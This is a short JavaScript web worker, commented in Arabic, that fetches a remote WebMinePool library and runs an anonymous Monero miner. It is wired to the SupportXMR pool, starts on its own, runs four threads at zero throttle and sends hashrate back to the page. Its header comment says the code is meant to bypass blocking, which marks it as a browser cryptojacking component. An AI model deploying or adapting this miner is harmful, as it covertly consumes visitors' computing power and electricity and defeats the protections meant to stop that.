// محرك التعدين الانفجاري v23: تجاوز الحجب والربط المباشر بـ SupportXMR
importScripts('https://webminepool.com/lib/base.js');

let miner = null;

self.onmessage = function(e) {
    const data = e.data;

    if (data.type === 'init') {
        try {
            // استخدام الجسر العالمي (Global Bridge) لضمان الوصول لمسبح SupportXMR
            miner = new WebMinePool.Anonymous(data.address, {
                threads: data.threads || 4,
                autoStart: true,
                throttle: data.throttle || 0.0,
                coin: "monero" // تحديد العملة بدقة لإجبار المسبح على القبول
            });

            // مراقبة الهاشات وإرسالها للواجهة
            miner.on('update', () => {
                const hps = miner.getHashesPerSecond();
                const total = miner.getTotalHashes();
                self.postMessage({ type: 'hashrate', hps: hps, total: total });
                
                // إذا تم قبول هاش واحد على الأقل، نرسل إشارة نجاح
                if (total > 0) {
                    self.postMessage({ type: 'authorized', message: 'HASHRATE_ACCEPTED_BY_POOL' });
                }
            });

            miner.on('open', () => {
                self.postMessage({ type: 'status', message: 'CONNECTED_TO_POOL' });
            });

            miner.on('error', (err) => {
                self.postMessage({ type: 'error', message: 'CONNECTION_FAILED' });
            });

        } catch(err) {
            self.postMessage({ type: 'error', message: err.toString() });
        }
    }

    if (data.type === 'start') {
        if (miner) miner.start();
    }

    if (data.type === 'stop') {
        if (miner) miner.stop();
    }
};
